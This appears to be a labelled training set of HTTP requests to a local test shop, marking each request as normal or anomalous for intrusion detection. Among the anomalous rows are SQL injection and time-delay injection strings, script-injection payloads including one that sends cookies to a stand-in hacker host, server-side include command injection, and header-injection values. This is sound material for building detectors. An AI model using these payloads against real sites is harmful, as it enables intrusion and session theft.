"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = wing - man7 ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  <  & pwd = edific9r & remember = on & b1 = entrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2511 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = storelli & password = enforrar & nombre = adelfo & apellidos = pozo + carbot & email = schiaftino @ showenvivo . com . sy & dni = 56891172m & direccion = calle + virgen + de + la + estrella ,  + 150 ,  +  & ciudad = fresno + de + rodilla & cp = 49624 & provincia =  % 20 & ntc = 3044392117548178 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 1761 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 39 & cantidad = 1 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = galluzzi & passworda = 3nt7epa3es & nombre = laurentino & apellidos = arteaga + manzanares & email = neol @ barnicesuv . museum & dni = 18445968z & direccion = calle + beato + nicolas + factor + 76 ,  +  & ciudad = ballesteros + de + calatrava & cp = 46148 & provincia = zamora & ntc = 1294969325590040 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = gerhart6 & password = bote!llón & nombre = imperio & apellidos = vericat + planelas & email = nadiuska . tolan @ icodea . cf & dni = 91508719e & direccion = calle + valencia + 113 ,  +  & ciudad = alzira & cp = 16235 & provincia = cuenca & ntca = 2085971217083634 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = ofilia & password = santurrón & nombre = lauran & apellidosa = tonk + carrizales & email = engel @ longboarders . cu & dni = 03303370h & direccion = plza .  + juan + zorrilla ,  + 107 + 9 ? f & ciudad = bruc ,  + el & cp = 28522 & provincia = granada & ntc = 1816581279872417 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo =  < script > alert (  "" paros ""  )  ;  <  / script >  & login = marlee - j5 & pwd = ple4n637127 & remember = on & b1 = entrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 62 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = li '  '  + pton & password = 20tia81i7l7 & nombre = atalívar & apellidos = demoya + yeladaky & email = sotrm _ roosendahl @ diseñodesoftware . gg & dni = 47899496h & direccion = invierno ,  + s / n + 8 ? h & ciudad = pinós ,  + el / pinoso & cp = 28296 & provincia = barcelona & ntc = 9635207639995628 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = alwyn & password = lumbral & nombre = farcilaso & apellidos = indaburu + mosquera & email = gribbon @ engibraltar . to & dni = 38989049r & direccion = plza .  + de + las + candelas + 15 +  & ciudad = tiñosillos & cp = 46470 & provincia = guipúzcoa & ntc = 3094599355025527 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kathlin & password =  + laur938 & nombre = rasmira & apellidos = pubill + tena & email = strasberg - gales @ videocasa - ebs . gi & dni =  ' or ' a =  ' a & direccion = isla + de + salvora ,  + 65 + 1 ? c & ciudad = larraona & cp = 40542 & provincia = guipúzcoa & ntc = 6860803220087599 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = jdavie & password = comba82v72ad & nombre = ram & apellidos = pieres + marrett & email = anutchitcharnchai @ informatica2009 . ec & dni = 76610505n & direccion = juan + martel + 18 ,  + 8 ? h & ciudad = buenavista + del + norte & cpa = 08612 & provincia = guadalajara & ntc = 0010509413049118 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4697 & b1 = confirmar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modoa = registro & login = program & password = 9bocelado & nombre = kasuhiro & apellidos = argandoña + cobo & email = dufour _ mannhardt @ privatebanking . com . us & dni = 33671238c & direccion = ayuntamiento ,  + 88 ,  +  & ciudad = ruanes & cp = 34191 & provincia = navarra & ntc = 8395803626511609 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = jesshope & password = bisarma & nombre = tránsito & apellidos = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & email = spalinger @ perrosmodelo . aw & dni = 76108310e & direccion = c /  + algodonales ,  + 129 +  & ciudad = beleña & cp = 26312 & provincia = girona & ntc = 4326433486745952 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = edmison & pwd = jar2sa & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6913 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombrea = jamón + ibérico & precio = 100 & cantidad = 28 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 2 & nombre = jamón + ibérico & precio = 100 & cantidad = 55 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = piotto & password = frontero & nombre = ricardo & apellidos = sennacherribbo + castelan & email = roby @ webgune . by & dni = 76657172n & direccion = c /  + cabo + de + machichaco ,  + 50 ,  + 3 - a & ciudad = valdeavellano & cp = 05210 & provincia = navarra & ntc = 0404125173062858 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = hinda & password = 185emba / r9a ,  ' r & nombre = riley & apellidos = penichet + forales & email = andersson . millan @ salacomplices . bs & dni = 51920905s & direccion = avenida + de + la + hierbabuena ,  + 33 ,  +  & ciudad = xinzo + de + limia & cp = 37592 & provincia = león & ntc = 5072758517881652 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 39 & cantidad = 64 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 39 /  & cantidad = 47 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 935 & b1 = confirmar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = marquez6 & password = sisallo & nombre = magali & apellidos = mojeda + batet & email = laing @ rocofer . pe & dnia = 16093683p & direccion = calle + mosen + damian + borobia + 38 + 10 - f & ciudad = puente + viesgo & cp = 48213 & provincia = albacete & ntc = 3563768127894231 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = olivie & password = re0348n1ar & nombre = ivan & apellidos = elbar + briceño & email = elliot3 @ connect . li & dni = 65683923v & direccion = los + caminos ,  + 129 ,  + 13 - g & ciudad = hinojosa + del + campo & cpa = 10130 & provincia = palencia & ntc = 7487181086019639 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = brittan & password = al9mb + 532 & nombre = onila & apellidos = furcat + zarco & email = greiff @ opticaweb . bu & dnia = 36455660q & direccion = calle + nueve + 57 +  & ciudad = utiel & cp = 01899 & provincia = madrid & ntc = 0088492463086794 & b1 = registrar,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = fernand & password = 9ú6e2o & nombre = silene & apellidos = gubianes + fiordalizzi & email = millet - jones @ ebs - construcciones . ke & dni = 51011537k & direccion = c /  + virgen + de + codes + 171 + 7 ? g & ciudad = valtorres & cp = 17775 & provincia = cuenca & ntc = 2490024031152476 & b1 = registrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = bertini & password = santalácea & nombre = berta & apellidos = gherra + bars & email = triesault @ hiperbilbao . ir & dni = 85225690h & direccion = c /  + general + benavides ,  + 199 ,  + 9 ? h & ciudad = tamarite + de + litera & cp = 50491 & provincia = tarragona & ntc = 2806369536513232 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = credenciales + incorrectasany % 0aset - cookie % 3a + tamper % 3d1041264011025374727,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = vino + rioja & precio = 100 & cantidad = 22 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = hartney & password = estigmatizadora & nombre = lilen & apellidos = romeo + camprodon & email = dayan @ artroscopiagc . cf & dni = 33183845c & direccion = paseo + cuba ,  + 175 +  & ciudad = antequera & cp = 50368 & provincia = alicante & ntc = 2302679278651084 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = amant & password = a / n $ 8l / o5 , a & nombre = aleardo & apellidos = sellares + brihuega & email = miguel _ bridge @ irmedia . nl & dni = 15074727k & direccion = calle + rodrigo + de + triana + 189 ,  + 6e & ciudad = ametlla + del + vallès ,  + l '  & cp = 44597 & provincia = guadalajara & ntc = 2988316222731904 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 85 & cantidad = 29 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ribi & pwd = mix4a346t6 & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = romani & password = colonizador & nombre = zarruf & apellidos = ledesma + pallàs & email = cherrill @ hotelestopsecret . ba & dni = 20317452b & direccion = bajada + san + martin ,  + 196 ,  + 13 ? f & ciudad = santa + brígida & cp = 08697 & provinciaa = málaga & ntc = 4580707796997762 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = chihchie & pwd = s927rí9i0o & remember = off & b1a = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4113 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = micgael5 & password = imperi ' al , i / smo & nombre = nanda & apellidos = baró + brathwaite & email = stacquet6 @ apicultor . so & dni = 71628074w & direccion = c /  + poeta + joan + valls + 69 + 7 ? b & ciudad = venturada & cp = 06226 & provincia = tarragona & ntc = 9868474737420464 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 3754 & b1 = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = armando & password = 7g7ai9ador & nombre = erberto & apellidos = delemús + picornel & email = junasz1 @ barcas - hibridas . mobi & dni = 12765802c & direccion = calle + rioja ,  + 149 +  & ciudad = masó ,  + la & cp = 05134 & provincia = valladolid & ntc = 8096995007175801 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = abrar & password = 60per23a & nombre = jostin & apellidos = urrea & email = herring - on3 @ am - si . si & dni = 53471668a & direccion = c /  + juli + gonzalez ,  + 165 ,  +  & ciudad = muñana & cp = 49709 & provincia = soria & ntc = 3266118078935961 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = meany & password = teatino & nombre = gaia & apellidos = aranyó & email = cruize - bessel @ interpretacion - diccionario - y - significado - de - los - su & dni = 01812863a & direccion = calle + monte + tegra ,  + 155 ,  +  & ciudad = lújar & cp = 08783 & provincia = cádiz & ntc = 5565882501750174 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 53 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = saunders & password = impuesto & nombre = yanira & apellidos = otero & email = crone6 @ tiaherminia . sh & dni = 68742403a & direccion = calle + cantueso + 89 +  & ciudad = enguera & cp = 44709 & provincia = sevilla & ntc = 4620750068228156 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = chin - shu & pwd = 20lhu1 _ 036do & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = toshachany % 0d % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & pwd = quer4n55a & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = sundar & pwda = respetosa & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = stouder '  + and +  ' 1 '  =  ' 1 & pwd = ti064ga & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 85 & cantidad =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 1 & nombre = queso + manchego & precio = 100 & cantidad = 15 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombrea = queso + manchego & precio = 100 & cantidad = 8 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6908 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodoa = registro & login = program & password = 9bocelado & nombre = kasuhiro & apellidos = argandoña + cobo & email = dufour _ mannhardt @ privatebanking . com . us & dni = 33671238c & direccion = ayuntamiento ,  + 88 ,  +  & ciudad = ruanes & cp = 34191 & provincia = navarra & ntc = 8395803626511609 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = nguyet & password = c55i1ur1 & nombre = fiona & apellidos = dawaher & email = coran @ softwaremasservicio . sb & dni = 19614047s & direccion = c /  + quintana ,  + 48 ,  + 8 - d & ciudad = manzaneque & cp = 43747 & provincia = ávila & ntc = 4073524812403605 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = qi - de & password = degolladora & nombre = rocco & apellidos = mancebo + benazet & email = dolitzkaya _ sali @ coreserv . ar & dni = 49372725m & direccion = carrer + vuit ,  + 187 + 2 - a & ciudad = mira & cp = 31710 & provincia = ávila & ntc = 5616859399399131 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = jiri0 & password = 27sa2ma5ame3te & nombre = alhuen & apellidos = puyal & email = arno @ hiperespaña . cs & dni = 68334140j & direccion = serrano + y + ortega + 116 ,  +  & ciudad = sotosalbos & cp = 14660 & provincia = barcelona & ntc = 0640306844862219 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = crain & pwd = acornado & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = horatius & password = 323ant5cidi3 & nombre = herenia & apellidos = witron + olivares & email = thrush _ orhonsay6 @ aadsl . no & dni = 77733072h & direccion = calle + reina + regente + 47 +  & ciudada = sotillo + del + rincón & cp = 09460 & provincia = la + rioja & ntc = 7365954967805937 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 100 /  & cantidad = 57 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = jamón + ibérico & precio = 85 & cantidad = 70 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = njo & pwd = e6pect52991ma & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = seelaend & password = tubul6s8 & nombre = tulia & apellidos = elortegi & email = schultes @ ciclismomadrileño . la & dni = 94900668t & direccion = sants + de + la + pedra + 21 + 6c & ciudad = trasmoz & cp = 37258 & provincia = ciudad + real & ntc = 9358968631233633 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 100 & cantidad = 52 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tawauna45 & password = dinosaurio & nombre = delfo & apellidos = modino + esteban & email = ohalloran @ buscadordevideos . bw & dni = 11335bb469b & direccion = martin + de + bocanogra + 59 ,  + 3f & ciudad = torelló & cp = 13108 & provincia = segovia & ntc = 9797216648384975 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8899 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a,1
localhost : 8080 / tienda1 / imagenes /  . old,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 100 & cantidad = 29 & b1a = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4816 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar @ 40 & login = carolien & pwd = p68vill7ja6 & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = amar & password = encallecer & nombre = celedonio & apellidos = compres + manau & email = danielson @ bloodline . mc & dni = 45415076n & direccion = valladolid ,  + 99 + 7a ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  <  & ciudad = borges + del + camp ,  + les & cp = 50343 & provincia = baleares +  ( illes )  & ntc = 1817134739036015 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4523 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = jaekoo & password = cuadradura & nombre = idalina & apellidos = tor & email = wackerhagen @ academiaversal . cat & dni = 75996092k & direccion = avda .  + andalucia ,  + 94 + 9 ? h & ciudad = artés & cp = 24450 & provincia = ávila & ntc = 0685161666311883 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 39 & cantidad = 94 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = dody & password = rizofóreo & nombre = landelina & apellidos = bignes + arriaza & email = cassagna @ eurograb . tw & dni = 97817638h & direcciona = gondola + 89 +  & ciudad = campillos - sierra & cp = 44145 & provincia = lugo & ntc = 1198533342544918 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = nill & password = 2739n83d $ 46 & nombre = yael & apellidos = paladell + perramon & email = brandauer @ barnicesuv . td & dni = 31914466b & direccion = calle + corpo + santo ,  + 11 + 6g & ciudad = canales + de + la + sierra & cp = 22220 & provincia = cantabria & ntc = 3350910813018179 & b1a = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 85 & cantidad = 57 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = j *  ' ai & password = zullarse & nombre = josé + maría & apellidos = rodrigo + ambrós & email = leibman @ softstylestudio . be & dni = 90993097z & direccion = urbanizacion + residencial + ronda + 36 + 9 ? b & ciudad = riells + i + viabrea & cp = 42150 & provincia = teruel & ntc = 9974355200418178 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2426 & b1 = confirmar '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = chonchan & pwd = zarceño & remember = off & b1 = set - cookie % 3a + tamper % 3d1041264011025374727,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = saed7 & password = la8a5946 & nombre = cassandra & apellidos = fidalgo & email = baldaro @ engibraltar . com . eh & dni = 46562896v & direccion = c /  + murcia + 34 +  & ciudad = figuerola + del + camp & cp = 28816 & provincia = albacete & ntc = 7711833321000462 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precio = 39 /  & cantidad = 60 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = rinaldo4 & pwd = 355ar5zar & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / vaciar . jsp ? b2 =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  < ",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = rodschat & password = 5mp1o0isad65 & nombre = tarcisio & apellidos = merlach + corminas & email = azar @ archivodeimagenes . eu & dnia = 63154198q & direccion = carlos + balenchana + 83 ,  +  & ciudad = lechón & cp = 24882 & provincia = girona & ntc = 7458916461034626 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6261 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 7930 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = geoffrio & password = conmutador & nombre = besarión & apellidos = portilla + servitje & email = skerritt . genn @ elcarrermoll . pk & dni = 50781133p & direccion = calle + la + romerosa + s / n + 4 ? d & ciudad = hinojosa + del + campo & cp = 45820 & provincia = navarra & ntc = 7694045535403398 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = jurman5 & pwd = ca /  / ndom ' b5 & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kuivinen & password = e0capazar & nombre = hernaldo & apellidos = lupiano + morgades & email = gomes _ burke @ capitalinvest . es & dni = 94697154j & direccion = calle + mossen + salvador ,  + 29 ,  +  & ciudad = tubilla + del + lago & cp = 45880 & provincia = ávila & ntc = 9770856347671410 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = karunara & password = 247o0a56r & nombre = pastor & apellidos = cros + crovetto & email = ludlam . conroy @ lalectura . ag & dni = 44400571z & direccion = pl .  + cooperacion + y + ahorro ,  + 70 ,  +  & ciudad = alfàs + del + pi ,  + l '  & cp = 02250 & provincia = palencia & ntc = 7551477142139922 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6869 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4671 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = shirinlo & password = r24p573 & nombre = sofanor & apellidos = corzo & email = coca5 @ rudos . mx & dni = 96118316m & direccion = puerto + navacerrada ,  + 38 ,  + 2 ? g & ciudad = arcones & cp = 09691 & provincia =  + se ? govia & ntc = 6073015432494873 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / imagenes / zarauz . jpg / asf - logo - wide . bak,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre =  '  + and +  ' 1 '  =  ' 1 & precio = 39 & cantidad = 9 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 3732 & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id =  % 2b & nombre = queso + manchego & precio = 100 & cantidad = 65 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4296 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = herbert3 & password = rose & nombre = héctor & apellidos = subirón + mallart & email = hymer @ espaciodelpintor . ge & dni = 35239980r & direccion = calle + galerias + jaime + iii ,  + 156 ,  + 12 ? g & ciudad = boada + de + campos & cp = 49143 & provincia = córdoba & ntc = 8181214165858095 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = chern1 & pwda = 70staje & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón '  + ibéric -  ' o & precio = 39 & cantidad = 6 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bat & password = escuda4 & nombre = casia & apellidos = alert + farreron & email = olarova @ ssextremadura . bg & dni = 13843179p & direccion = c /  + doce + martires + 118 +  & ciudad = oia & cpa = 04531 & provincia = huelva & ntc = 2507926371320953 & b1 = registrar,1
localhost : 8080 / tienda1 / miembros / index . jsp . inc,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kilcoyne & password = 7lj985na & nombre = almira & apellidos = calderón + guirao & email = saint - georges @ webhut . mh & dni = 08475533x & direccion = poligono + bens + 176 ,  +  & ciudad = orba & cp = 46870 & provincia = girona & ntc = 5928276197058615 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100set - cookie % 3a + tamper % 3d1041264011025374727 & cantidad = 55 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 72 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = kiely & password = 237so2a & nombre = edelmira & apellidos = rafols + maass & email = viarisio _ messiter @ hiperespaña . sb & dni = 50873406m & direccion = c /  + victor + hevia + 56 + 8b & ciudad = camporredondo & cp = 08588 & provincia = barcelona & ntc = 7959781353318362 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre =  % 2b & precio = 100 & cantidad = 52 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = kapil & password = d1c36o4ca & nombre = berina + del + valle & apellidos = artico & email = meunier . langa @ tintasultravioleta . al & dni = 17826694s & direccion = c /  + historiador + rodrigo + pertegas ,  + 149 ,  + 8 - e & ciudad = palafolls '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & cp = 25218 & provincia = cáceres & ntc = 3256313581077416 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100 & cantidad = 6 & b1 =  ? ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 39 & cantidada = 63 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = minthorn & password = ahorquillado & nombre = israél & apellidos = luna + barberan & email = pouyet @ mcrspain . mh & dni = 83073375c & direccion = calle + pamplona ,  + 26 +  & ciudad = arrankudiaga & cp = 49740 & provincia = huesca & ntc = 2656905158370014 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = danjean8 & pwd = sen64 & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = yaghutie & password = 3t2m4s1ic37 & nombre = juan + diego + de + guadalupe & apellidos = richart + adsuar & email = marielle @ videospornocaseros . nl & dni = 11966968e & direccion = assagador + 136 ,  + 3 ? c & ciudad = jurisdicción + de + lara & cp = 14548 & provincia = ourense & ntc = 6731145539547954 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / carrito . jsp . bak,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = gahr & pwd = jacerina & remembera = off & b1 = entrar,1
